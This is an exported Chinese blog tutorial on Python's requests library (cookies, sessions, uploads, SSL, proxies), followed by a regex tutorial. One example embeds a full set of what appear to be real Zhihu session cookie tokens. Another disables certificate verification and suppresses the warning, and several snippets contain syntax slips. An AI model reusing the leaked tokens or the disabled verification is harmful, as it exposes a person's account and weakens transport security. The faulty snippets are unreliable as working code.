<h2 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h2><p>发送请求之后，还有很多属性和方法可以用来获取其他信息，比如状态码，响应头，cookies等<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="symbol">'User</span>-<span class="type">Agent</span>':<span class="symbol">'Mozilla</span>/<span class="number">5.0</span> (<span class="type">Macintosh</span>; <span class="type">Intel</span> <span class="type">Mac</span> <span class="type">OS</span> <span class="type">X</span> <span class="number">10</span>_11_4) <span class="type">AppleWebKit</span>/<span class="number">537.36</span> (<span class="type">KHTML</span>, like <span class="type">Gecko</span>) <span class="type">Chrome</span>/<span class="number">52.0</span><span class="number">.2743</span><span class="number">.116</span> <span class="type">Safari</span>/<span class="number">537.36</span>'</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r=requests.get(<span class="symbol">'http</span>:<span class="comment">//www.jianshu.com',headers=headers)</span></span><br><span class="line">print(<span class="class"><span class="keyword">type</span>(<span class="params">r.status_code</span>),<span class="title">r</span>.<span class="title">status_code</span>) <span class="title">#状态码</span></span></span><br><span class="line"><span class="class"><span class="title">print</span>(<span class="params">type(r.headers</span>),<span class="title">r</span>.<span class="title">headers</span>) <span class="title">#响应头</span></span></span><br><span class="line"><span class="class"><span class="title">print</span>(<span class="params">type(r.cookies</span>),<span class="title">r</span>.<span class="title">cookies</span>) <span class="title">#cookies</span></span></span><br><span class="line"><span class="class"><span class="title">print</span>(<span class="params">type(r.url</span>),<span class="title">r</span>.<span class="title">url</span>) <span class="title">#URL</span></span></span><br><span class="line"><span class="class"><span class="title">print</span>(<span class="params">type(r.history</span>),<span class="title">r</span>.<span class="title">history</span>) <span class="title">#历史信息</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">运行结果：</span></span></span><br><span class="line"><span class="class"><span class="title">&lt;class</span> '<span class="title">int</span>'<span class="title">&gt;</span> 200</span></span><br><span class="line"><span class="class"><span class="title">&lt;class</span> '<span class="title">requests</span>.<span class="title">structures</span>.<span class="title">CaseInsensitiveDict</span>'<span class="title">&gt;</span> </span>&#123;<span class="symbol">'Serve</span>r': <span class="symbol">'Tengin</span>e', <span class="symbol">'Dat</span>e': <span class="symbol">'Sun</span>, <span class="number">22</span> <span class="type">Mar</span> <span class="number">2020</span> <span class="number">01</span>:<span class="number">52</span>:<span class="number">40</span> <span class="type">GMT</span>', <span class="symbol">'Content</span>-<span class="type">Type</span>': <span class="symbol">'text</span>/html; charset=utf<span class="number">-8</span>', <span class="symbol">'Transfer</span>-<span class="type">Encoding</span>': <span class="symbol">'chunke</span>d', <span class="symbol">'Connectio</span>n': <span class="symbol">'keep</span>-alive', <span class="symbol">'Var</span>y': <span class="symbol">'Accept</span>-<span class="type">Encoding</span>', <span class="symbol">'X</span>-<span class="type">Frame</span>-<span class="type">Options</span>': <span class="symbol">'SAMEORIGI</span>N', <span class="symbol">'X</span>-<span class="type">XSS</span>-<span class="type">Protection</span>': <span class="symbol">'1</span>; mode=block', <span class="symbol">'X</span>-<span class="type">Content</span>-<span class="type">Type</span>-<span class="type">Options</span>': <span class="symbol">'nosnif</span>f', <span class="symbol">'ETa</span>g': <span class="symbol">'W</span>/<span class="string">"1ea451f67bc819347103e9b76476e65a"</span>', <span class="symbol">'Cache</span>-<span class="type">Control</span>': <span class="symbol">'max</span>-age=<span class="number">0</span>, <span class="keyword">private</span>, must-revalidate', <span class="symbol">'Set</span>-<span class="type">Cookie</span>': <span class="symbol">'locale</span>=zh-<span class="type">CN</span>; path=/', <span class="symbol">'X</span>-<span class="type">Request</span>-<span class="type">Id</span>': <span class="symbol">'06499cd3</span><span class="number">-15e7</span><span class="number">-4e36</span>-b4cf<span class="number">-3</span>be2a52a5710', <span class="symbol">'X</span>-<span class="type">Runtime</span>': <span class="symbol">'0</span><span class="number">.004692</span>', <span class="symbol">'Strict</span>-<span class="type">Transport</span>-<span class="type">Security</span>': <span class="symbol">'max</span>-age=<span class="number">31536000</span>; includeSubDomains; preload', <span class="symbol">'Content</span>-<span class="type">Encoding</span>': <span class="symbol">'gzi</span>p'&#125;</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">requests</span>.<span class="title">cookies</span>.<span class="title">RequestsCookieJar</span>'<span class="title">&gt;</span> <span class="title">&lt;RequestsCookieJar</span>[&lt;<span class="type">Cookie</span> locale=zh-<span class="type">CN</span> for www.jianshu.com/&gt;]<span class="title">&gt;</span></span></span><br><span class="line"><span class="class"><span class="title">&lt;class</span> '<span class="title">str</span>'<span class="title">&gt;</span> <span class="title">https</span></span>:<span class="comment">//www.jianshu.com/</span></span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">list</span>'<span class="title">&gt;</span> [&lt;<span class="type">Response</span> [301]<span class="title">&gt;</span>]</span></span><br></pre></td></tr></table></figure><br>可以看到cookie的类型是RequestsCookieJar</p>
<p>状态码用来判断请求是否成功，requests还提供了一个内置的状态码查询对象requests.codes<br><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r=requests.get(<span class="string">'http://www.jianshu.com'</span>,headers=headers)</span><br><span class="line"><span class="keyword">exit</span>() <span class="keyword">if</span> not r.status_code == requests.codes.ok <span class="keyword">else</span> print(<span class="string">'Request Successfully'</span>)</span><br><span class="line"></span><br><span class="line">运行结果为：</span><br><span class="line">Request Successfully</span><br></pre></td></tr></table></figure></p>
<h1 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h1><p>前面都是requests的基本用法，GET POST Response对象等都比较简单</p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>requests可以模拟提交一些数据，例如有的网站上需要上传文件，我们也可以用它来实现<br><figure class="highlight processing"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">files=&#123;<span class="string">'file'</span>:<span class="built_in">open</span>(<span class="string">'favicon.ico'</span>,<span class="string">'rb'</span>)&#125;</span><br><span class="line">r=requests.post(<span class="string">"http://httpbin.org/post"</span>,files=files)</span><br><span class="line"><span class="built_in">print</span>(r.<span class="built_in">text</span>)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"args"</span>: &#123;&#125;, </span><br><span class="line">  <span class="string">"data"</span>: <span class="string">""</span>, </span><br><span class="line">  <span class="string">"files"</span>: &#123;</span><br><span class="line">    <span class="string">"file"</span>: <span class="string">"data:application/octet-stream;base64,span></span><br><span class="line">  &#125;, </span><br><span class="line">  <span class="string">"form"</span>: &#123;&#125;, </span><br><span class="line">  <span class="string">"headers"</span>: &#123;</span><br><span class="line">    <span class="string">"Accept"</span>: <span class="string">"*/*"</span>, </span><br><span class="line">    <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>, </span><br><span class="line">    <span class="string">"Content-Length"</span>: <span class="string">"6665"</span>, </span><br><span class="line">    <span class="string">"Content-Type"</span>: <span class="string">"multipart/form-data; boundary=1f6ee2e34e162a655b76fbd0ad97b62d"</span>, </span><br><span class="line">    <span class="string">"Host"</span>: <span class="string">"httpbin.org"</span>, </span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"python-requests/2.22.0"</span>, </span><br><span class="line">    <span class="string">"X-Amzn-Trace-Id"</span>: <span class="string">"Root=1-5e76c710-5837c96888eea320b3bd36b8"</span></span><br><span class="line">  &#125;, </span><br><span class="line">  <span class="string">"json"</span>: <span class="keyword">null</span>, </span><br><span class="line">  <span class="string">"origin"</span>: <span class="string">"117.136.85.194"</span>, </span><br><span class="line">  <span class="string">"url"</span>: <span class="string">"http://httpbin.org/post"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到form中是空的，但是包含了files这个字段，每个文件上传部分都会单独有一个files字段来标识</p>
<h2 id="cookies"><a href="#cookies" class="headerlink" title="cookies"></a>cookies</h2><p>前面的urllib处理过cookies，但是写法比较复杂，所有有了requests，requests中提供了获取和设置cookies的方法，很简单<br><figure class="highlight fsharp"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">r=requests.get(<span class="string">"https://www.baidu.com"</span>)</span><br><span class="line">print(r.cookies)</span><br><span class="line"><span class="keyword">for</span> key , value <span class="keyword">in</span> r.cookies.items():</span><br><span class="line">	print(key + '=' + value)</span><br><span class="line">    </span><br><span class="line">运行结果：</span><br><span class="line">&lt;RequestsCookieJar<span class="meta">[&lt;Cookie BDORZ=27315 for .baidu.com/&gt;]</span>&gt;</span><br><span class="line">BDORZ=<span class="number">27315</span></span><br></pre></td></tr></table></figure><br>这里调用cookies的属性既可以成功得到cookies，发现它是RequestsCookieJar类型。然后用items()方法将其转换为元组组成的列表，遍历输出每一个cookie的名称和值，实现cookies的遍历解析</p>
<p>当然我们还可以用cookie来维持我们的登陆状态，就拿教务系统为例：<br><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">headers=&#123;</span><br><span class="line">    'Cookie': 'zap=8ac<span class="number">2503</span>f-7fe8-476a-a490-d9b<span class="number">0166</span>a7c31; d_c0="ABDbVN5-1BCPTu31BrE8dbZVa2anFNBX3QM=|<span class="number">1581918243</span>"; _ga=GA1.2.<span class="number">68483630</span>9.<span class="number">1582691971</span>; _xsrf=<span class="number">94437525-57</span>aa-4c39-bfa2-2f<span class="number">49115927</span>2f; _gid=GA1.2.<span class="number">2103874114.1584</span><span class="number">840620</span>; Hm_lvt_98beee57fd2ef70ccdd5ca52b<span class="number">9740</span>c49=<span class="number">1583378456</span>,<span class="number">1584091036</span>,<span class="number">1584840622</span>,<span class="number">1584843007</span>; capsion_ticket="2|1:0|10:<span class="number">1584843026</span>|14:capsion_ticket|44:MjM3ODRjNmJlZDYxNGU2MGFiZjU5MzlhN2FhNmU0ZDk=|dceb5af<span class="number">4422</span>b<span class="number">839953</span>c82bf<span class="number">5014</span>c<span class="number">9898</span>1be979abcd9caea0fdfdfa190bb4ba7d"; z_c0="2|1:0|10:<span class="number">1584843045</span>|4:z_c0|92:Mi4xajZVTER3QUFBQUFBRU50VTNuN1VFQ1lBQUFCZ0FsVk5KUmRrWHdBczViZTl3bFBDT3RMOW5seTBPVE9mSGFyUnh3|081aaea5a53d<span class="number">6430</span>b215ec49a56c515affede7f714f31f8a7cf4e8c4ab<span class="number">8352</span>ce"; unlock_ticket="AGBmWYhrNg8mAAAAYAJVTS3Qdl4ITSIEUmqxCEPPZ_A4Vq_p7IrlvQ=="; Hm_lpvt_98beee57fd2ef70ccdd5ca52b<span class="number">9740</span>c49=<span class="number">1584843051</span>; tst=r; KLBRSID=d1f07ca9b<span class="number">929274</span>b65d830a00cbd719a|<span class="number">1584843053</span>|<span class="number">1584840596</span>',</span><br><span class="line">    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.<span class="number">3987.14</span>9 Safari/537.36',</span><br><span class="line">    'Host':'www.zhihu.com'</span><br><span class="line">&#125;</span><br><span class="line">r=requests.get('https://www.zhihu.com',headers=headers)</span><br><span class="line">print(r.text)</span><br><span class="line">运行结果：</span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"zh"</span> data-hairline=<span class="string">"true"</span> data-theme=<span class="string">"light"</span>&gt;&lt;head&gt;&lt;meta charSet=<span class="string">"utf-8"</span>/&gt;&lt;title data-react-helmet=<span class="string">"true"</span>&gt;首页 - 知乎&lt;/title&gt;&lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width,initial-scale=1,maximum-scale=1"</span>/&gt;&lt;meta name=<span class="string">"renderer"</span> content=<span class="string">"webkit"</span>/&gt;&lt;meta name=<span class="string">"force-rendering"</span> content=<span class="string">"webkit"</span>/&gt;&lt;meta http-equiv=<span class="string">"X-UA-Compatible"</span> content=<span class="string">"IE=edge,chrome=1"</span>/&gt;&lt;meta name=<span class="string">"google-site-verification"</span> content=<span class="string">"FTeR0c8arOPKh8c5DYh_9uu98_zJbaWw53J-Sch9MTg"</span>/&gt;&lt;meta name=<span class="string">"description"</span> property=<span class="string">"og:description"</span> content=<span class="string">"有问题，上知乎。知乎，可信赖的问答社区，以让每个人高效获得可信赖的解答为使命。知乎凭借认真、专业和友善的社区氛围，结构化、易获得的优质内容，基于问答的内容生产方式和独特的社区机制，吸引、聚集了各行各业中大量的亲历者、内行人、领域专家、领域爱好者，将高质量的内容透过人的节点来成规模地生产和分享。用户通过问答等交流方式建立信任和连接，打造和提升个人影响力，并发现、获得新机会。"</span>/&gt;&lt;link data-react-helmet=<span class="string">"true"</span> rel=<span class="string">"apple-touch-icon"</span> href=<span class="string">"https://static.zhihu.com/heifetz/assets/apple-touch-icon-152.67c7b278.png"</span>/&gt;&lt;link data-react-helmet=<span class="string">"true"</span> rel=<span class="string">"apple-touch-icon"</span> href=<span class="string">"https://static.zhihu.com/heifetz/assets/apple-touch-icon-152.67c7b278.png"</span> sizes=<span class="string">"152x152"</span>/&gt;&lt;link data-react-helmet=<span class="string">"true"</span> rel=<span class="string">"apple-touch-icon"</span> href=<span class="string">"https://static.zhihu.com/heifetz/assets/apple-touch-icon-120.b3e6278d.png"</span> sizes=<span class="string">"120x120"</span>/&gt;&lt;link data-react-helmet=<span class="string">"true"</span> rel=<span class="string">"apple-touch-icon"</span> href=<span class="string">"https://static.zhihu.com/heifetz/assets/apple-touch-icon-76.7a750095.png"</span> sizes=<span class="string">"76x76"</span>/&gt;&lt;link data-react-helmet=<span class="string">"true"</span> rel=<span class="string">"apple..........</span></span><br></pre></td></tr></table></figure><br>得到登录后的结果，这样表示登录成功了<br>我们还可以构造RequestsCookieJar对象，效果基本一样，就不再多介绍</p>
<h2 id="会话维持"><a href="#会话维持" class="headerlink" title="会话维持"></a>会话维持</h2><p>在requests中，如果直接利用get()或post()等方法的确可以做到模拟网页的请求，但是这实际上是相当于不同的会话，也就是说相当于你用了两个浏览器打开了不同的页面<br>这样就两个完全不相关的会话，并不能获取到个人信息，所以我们要利用Seesion对象<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"><span class="attribute">s</span>=requests.Session()</span><br><span class="line">s.<span class="builtin-name">get</span>(<span class="string">'http://httpbin.org/cookies/set/num/123456789'</span>)</span><br><span class="line"><span class="attribute">r</span>=s.get('http://httpbin.org/cookies')</span><br><span class="line"><span class="builtin-name">print</span>(r.text)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"cookies"</span>: &#123;</span><br><span class="line">    <span class="string">"num"</span>: <span class="string">"123456789"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里也实验一下BUGKU中的python练习题，秋名山车神<a href="http://123.206.87.240:8002/qiumingshan/" target="_blank" rel="noopener">http://123.206.87.240:8002/qiumingshan/</a></p>
<p>这个题就是让你计算出表达式的值，但是这个表达式存在的时间很短而且数值很大，所以需要利用脚本<br><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url='http://123.206.87.240:8002/qiumingshan/'</span><br><span class="line">r=requests.session() <span class="comment">#维持会话</span></span><br><span class="line">page=r.get(url)  <span class="comment">#获取表达式</span></span><br><span class="line">ans=re.findall(r'&lt;div&gt;(.*?)=?;&lt;/div&gt;',page.text) <span class="comment">#获取表达式</span></span><br><span class="line">ans=<span class="string">""</span>.join(ans) <span class="comment">#列表转成字符串</span></span><br><span class="line">ans=ans[:-2] <span class="comment">#去掉=?</span></span><br><span class="line">print(ans) <span class="comment">#查看表达式</span></span><br><span class="line">post=eval(ans) <span class="comment">#计算</span></span><br><span class="line">data=&#123;</span><br><span class="line">    'value': post</span><br><span class="line">&#125; <span class="comment">#传值</span></span><br><span class="line">flag=r.post(url,data=data)</span><br><span class="line">print(flag.text)</span><br><span class="line"></span><br><span class="line"><span class="section">得到flag:</span></span><br><span class="line">Bugku&#123;YOU_DID_IT_BY_SECOND&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="SSL证书验证"><a href="#SSL证书验证" class="headerlink" title="SSL证书验证"></a>SSL证书验证</h2><p>requests还提供了证书验证的功能，当发送HTTP请求的时候，它会检查SSL证书，我们可以用verify参数控制是否检查此证书，如果不加，默认是True，会自动验证<br><figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">response=requests.get(<span class="string">'https://12306.cn'</span>，verify=False)</span><br><span class="line">print(response.status_code)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="symbol">C:</span>\Python38\<span class="class"><span class="keyword">lib</span>\<span class="title">site</span>-<span class="title">packages</span>\<span class="title">urllib3</span>\<span class="title">connectionpool</span>.<span class="title">py</span>:997: <span class="title">InsecureRequestWarning</span>: <span class="title">Unverified</span> <span class="title">HTTPS</span> <span class="title">request</span> <span class="title">is</span> <span class="title">being</span> <span class="title">made</span>. <span class="title">Adding</span> <span class="title">certificate</span> <span class="title">verification</span> <span class="title">is</span> <span class="title">strongly</span> <span class="title">advised</span>. <span class="title">See</span>: <span class="title">https</span>://<span class="title">urllib3</span>.<span class="title">readthedocs</span>.<span class="title">io</span>/<span class="title">en</span>/<span class="title">latest</span>/<span class="title">advanced</span>-<span class="title">usage</span>.<span class="title">html</span><span class="comment">#ssl-warnings</span></span></span><br><span class="line">  warnings.warn(</span><br><span class="line"><span class="number">200</span></span><br></pre></td></tr></table></figure><br>这里有一个警告，建议我们给他指定证书，我们可以通过设置屏蔽这个警告：<br><figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">from requests.packages <span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line">response=requests.<span class="keyword">get</span>('https:<span class="comment">//www.12306.cn/index/',verify=False)</span></span><br><span class="line"><span class="built_in">print</span>(response.status_code)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">200</span></span><br></pre></td></tr></table></figure></p>
<h2 id="代理设置"><a href="#代理设置" class="headerlink" title="代理设置"></a>代理设置</h2><p>前面说到爬虫如果操作不当，就会被封禁IP，所以在大规模爬取时需要设置代理<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">proxies=&#123;</span><br><span class="line">	<span class="string">"http"</span>:<span class="string">"http://10.10.1.10:3128"</span>,</span><br><span class="line">    <span class="string">"https"</span>:<span class="string">"http://10.10.1.10:1080"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">requests.<span class="builtin-name">get</span>(<span class="string">"https://www.taobao.com"</span>,<span class="attribute">proxies</span>=proxies)</span><br><span class="line"></span><br><span class="line">当然这个实例是无效的，需要更换成自己的代理</span><br></pre></td></tr></table></figure></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.一些网站会识别并拦截爬虫，所以尽量养成习惯，不管是测试还是爬取哪个网站，都加上headers等相关内容</p>
<p>2.在进行爬取之前，先使用status_code,headers,cookies,history,URL等方法配合type()来进行准备工作，查看是否连接成功，类型等</p>
<p>3.在一些网站中，如果想要进一步进行操作，例如登录并查询成绩这种，就需要使用session()方法来维持该会话，让cookies是一致的，还需要注意的是，网上一些教程中session()会将首字母s大写S,这样会导致报错</p>
<p>4.爬取大量网站时，必须使用代理，以免造成一些不必要的麻烦</p>
<p>5.爬虫获取到的内容是str类型的，需要根据情况使用decode,encode,json等方法来进行转换</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Python3开发</category>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Python3-2020/3/13-正则与urllib</title>
    <url>/2020/03/13/Python3-2020-3-13-%E5%91%A8%E6%8A%A53/</url>
    <content><![CDATA[<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><p>正则表达式常用在我们的生活中，例如检测邮箱是否合法，手机号，身份证是否正确等</p>
<h2 id="re模块"><a href="#re模块" class="headerlink" title="re模块"></a>re模块</h2><p>在python中内置了专门处理正则表达式的re模块，有了re模块就可以在程序中使用正则表达式及其相关函数</p>
<h3 id="match函数"><a href="#match函数" class="headerlink" title="match函数"></a>match函数</h3><p>格式<br>match(pattern,string)</p>
<p>pattern表示正则表达式，string表示待匹配的字符串</p>
<p>功能<br>对待匹配的字符串按从左到右的顺序，使用正则表达式进行匹配。如果从左侧开始有一个子串能够与其匹配，则不会继续向后匹配。随后返回结果</p>
<p>例如<br>匹配一个字符串中是否有“python”字符串<br><figure class="highlight processing"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="built_in">str</span> = <span class="string">"python java python c++"</span></span><br><span class="line">rs= re.<span class="built_in">match</span>(<span class="string">"python"</span>,<span class="built_in">str</span>)</span><br><span class="line"><span class="built_in">print</span>(rs)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">&lt;_sre.SRE_Match object;span=(<span class="number">0</span>,<span class="number">6</span>),<span class="built_in">match</span>=<span class="string">'python'</span>&gt;</span><br></pre></td></tr></table></figure></p>
<p>获取正则表达式匹配成功的子串<br><figure class="highlight processing"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="built_in">str</span> = <span class="string">"python java python c++"</span></span><br><span class="line">rs= re.<span class="built_in">match</span>(<span class="string">"python"</span>,<span class="built_in">str</span>)</span><br><span class="line"><span class="built_in">print</span>(rs.group())</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">python</span><br></pre></td></tr></table></figure></p>
<h2 id="单字符匹配"><a href="#单字符匹配" class="headerlink" title="单字符匹配"></a>单字符匹配</h2><p>单字符匹配就是正则当中基础部分，下表列举了常用的正则单字符匹配符号</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>符号</th>
<th>描述 </th>
</tr>
</thead>
<tbody>
<tr>
<td>.</td>
<td>匹配除”\n”之外的任意单个字符 </td>
</tr>
<tr>
<td>\d</td>
<td>匹配0到9之间的一个数字，等价于[0-9]</td>
</tr>
<tr>
<td>\s</td>
<td>匹配任意空白字符，如空格，制表符”\t”，换行”\n”等</td>
</tr>
<tr>
<td>\w</td>
<td>匹配单词字符，包括字母，数字，下划线</td>
</tr>
<tr>
<td>\D</td>
<td>匹配一个非数字字符，等价于[^0-9]</td>
</tr>
<tr>
<td>\S</td>
<td>匹配任意非空白字符</td>
</tr>
<tr>
<td>\W</td>
<td>匹配非单词字符</td>
</tr>
<tr>
<td>[]</td>
<td>匹配[]中列举的字符</td>
</tr>
</tbody>
</table>
</div>
<p>例如<br>使用点号<code>.</code>匹配除换行符”\n”之外的任意一个单字符</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">rs=re.match(<span class="string">"."</span>,<span class="string">"1"</span>)#匹配一个包括数字的字符串</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(rs.group()</span></span>)</span><br><span class="line">rs=re.match(<span class="string">"."</span>,<span class="string">"a"</span>)#匹配一个包括单字符的字符串</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(rs.group()</span></span>)</span><br><span class="line">rs=re.match(<span class="string">"."</span>,<span class="string">"abc"</span>)#匹配一个包括多字符的字符串</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(rs.group()</span></span>)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="number">1</span></span><br><span class="line">a</span><br><span class="line">a</span><br></pre></td></tr></table></figure>
<p>使用多个点好匹配多个单字符<br><figure class="highlight golo"><table><tr><td class="code"><pre><span class="line">rs=re.<span class="keyword">match</span>(<span class="string">"..."</span>,<span class="string">"abc"</span>)<span class="comment">#匹配多字符的字符串</span></span><br><span class="line"><span class="keyword">print</span>(rs.group())</span><br><span class="line">rs=re.<span class="keyword">match</span>(<span class="string">"."</span>,<span class="string">"\n"</span>)<span class="comment">#不会匹配返回None</span></span><br><span class="line"><span class="keyword">print</span>(rs.group())</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">abc</span><br><span class="line">None</span><br></pre></td></tr></table></figure></p>
<p>但是单单只是匹配单个字符，在日常生活中的应用还是很少的，所以常用的还有\w,\d等，方法与点号类似 不在多介绍</p>
<h2 id="数量表示"><a href="#数量表示" class="headerlink" title="数量表示"></a>数量表示</h2><p>虽然在匹配多个字符的时候可以使用<code>...</code>这样的方式来匹配，但是较为麻烦，所以正则中还有表示数量的符号，下表是常用的数量表示符号</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>符号</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>*</td>
<td>匹配一个字符出现0次或多次</td>
<td></td>
</tr>
<tr>
<td>+</td>
<td>匹配一个字符至少出现一次，等价于{1,}</td>
<td></td>
</tr>
<tr>
<td>?</td>
<td>匹配一个字符至多出现一次，也就是出现0次或1次，等价于{0,1}</td>
<td></td>
</tr>
<tr>
<td>{m}</td>
<td>匹配一个字符出现m次</td>
<td></td>
</tr>
<tr>
<td>{m,}</td>
<td>匹配一个字符至少出现m次</td>
<td></td>
</tr>
<tr>
<td>{m,n}</td>
<td>匹配一个字符出现m到n次</td>
<td></td>
</tr>
</tbody>
</table>
</div>
<p>例如：<br>检查用户信息是否完整<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">user_infos=[<span class="string">"Tom,13812345678,20"</span>,<span class="string">"David,,30"</span>,<span class="string">"Lilei,18851888888,25"</span>]</span><br><span class="line"><span class="keyword">for</span><span class="built_in"> user </span><span class="keyword">in</span> user_infos:</span><br><span class="line">	<span class="attribute">rs</span>=re.match("\w+,[0-9]&#123;11&#125;,\d+<span class="string">",user)</span></span><br><span class="line"><span class="string">    if rs!=None:</span></span><br><span class="line"><span class="string">    	print("</span>用户信息：&#123;&#125;<span class="string">"。format(rs.group()))</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">    	print("</span>用户信息不完整<span class="string">")</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">输出结果:</span></span><br><span class="line"><span class="string">用户信息：Tom,13812345678,20</span></span><br><span class="line"><span class="string">用户信息不完整</span></span><br><span class="line"><span class="string">用户信息：Lilei,18851888888,25</span></span><br></pre></td></tr></table></figure></p>
<p>验证手机号是否合法<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#合法手机的规则是11位组成，第一位是1，第二位是[3,5,7,8]其中一个，第三位到最后都是数字</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg_phone</span><span class="params">(phone)</span>:</span></span><br><span class="line">	rs=re.match(<span class="string">"1[3578]\d&#123;9&#125;"</span>,phone)</span><br><span class="line">    <span class="keyword">if</span> rs==<span class="literal">None</span>:</span><br><span class="line">    	<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    	print(rs.group())</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">   </span><br><span class="line">输入：<span class="number">13612345678</span></span><br><span class="line">输出 <span class="literal">True</span></span><br></pre></td></tr></table></figure></p>
<h2 id="边界表示"><a href="#边界表示" class="headerlink" title="边界表示"></a>边界表示</h2><p>在正则中还可以使用边界规则限制待匹配的字符串开始或结束的边界</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>符号</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>^</td>
<td>匹配字符串开头</td>
<td></td>
</tr>
<tr>
<td>$</td>
<td>匹配字符串结尾</td>
<td></td>
</tr>
</tbody>
</table>
</div>
<p>例如：<br>验证标识符是否合法<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg_identifier</span><span class="params">(str)</span>:</span></span><br><span class="line">	rs=re.match(<span class="string">"^[0-9]\w*"</span>,str)</span><br><span class="line">    <span class="keyword">if</span> rs!=<span class="literal">None</span>:</span><br><span class="line">    	<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        </span><br><span class="line">print(<span class="string">"标识符1_name是否合法：&#123;&#125;"</span>.format(reg_identifier(<span class="string">"1_name"</span>)))</span><br><span class="line">print(<span class="string">"标识符name_1是否合法：&#123;&#125;"</span>.format(reg_identifier(<span class="string">"name_1"</span>)))</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">标识符<span class="number">1</span>_name是否合法：<span class="literal">False</span></span><br><span class="line">标识符name_1是否合法：<span class="literal">True</span></span><br></pre></td></tr></table></figure><br>在这个例子中，正则表达式的意思是凡是以数字开头，出现0次或多次的标识符都是非法的</p>
<h2 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h2><p>转义字符在很多编程语言中都存在，一般常见的是<code>\</code><br>专业字符的作用就是，转移一些特殊的符号或者字母</p>
